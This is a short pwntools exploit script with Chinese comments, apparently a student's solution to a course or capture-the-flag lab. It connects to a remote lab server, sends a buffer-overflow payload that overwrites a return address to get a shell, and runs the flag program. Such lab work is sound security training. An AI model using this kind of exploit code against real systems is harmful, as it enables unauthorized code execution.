from pwn import *

sh = remote('47.99.80.189', 10002)    # pwntools通过socket连接至远端
sh.recvuntil("Please input your StudentID:\n") # 远程环境统一要求输入学号    
sh.sendline('3180105507')
sh.recvuntil("[*] Give me something to overflow me! \n") 

# 通过缓冲区溢出覆盖程序的返回地址，跳转至目的函数获取shell
payload = b'a' + b'\0' + b'a' * 20 + p32(0x08048576)
sh.sendline(payload)        # 发送计算的payload

sh.recvuntil("[HACKED]\n")    # 交互至接受完 "[HACKED]\n"
sh.sendline("./flag.exe 3180105507") 
sh.interactive()    # 将代码交互转换为手工交互